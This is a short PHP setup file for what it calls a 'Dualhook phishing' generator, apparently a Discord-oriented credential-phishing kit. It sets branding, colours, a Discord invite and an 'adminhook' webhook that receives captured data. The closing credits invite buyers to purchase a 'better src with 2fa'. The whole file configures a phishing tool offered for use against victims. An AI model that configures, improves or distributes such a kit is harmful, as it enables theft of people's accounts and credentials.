<?php

// Setup file for users!

$name = "Termed#0001"; // Change to any name u want for ur generator
$image = "https://media.discordapp.net/attachments/1097841417591738378/1098664331828285501/tumblr_1f782183a9ea642e79b07d82c180da50_bbefd568_400.png?width=360&height=360"; // Any Image u want
$Backgroundcolor = "white"; // Examples white, blue, orange, yellow, wheat
$adminhook = "WEBHOOK HERE!"; // Change to ur dualhook webhook!
$discord = ".gg/incog"; // change discord server to ur server
$colorTitle = "blue"; // Example colors for title white, black, or any other color lol


// Credits Termed#0001 | Message me if u wanna buy a better src with 2fa and more for cheap!
// Enjoy Dualhook phishing!


?>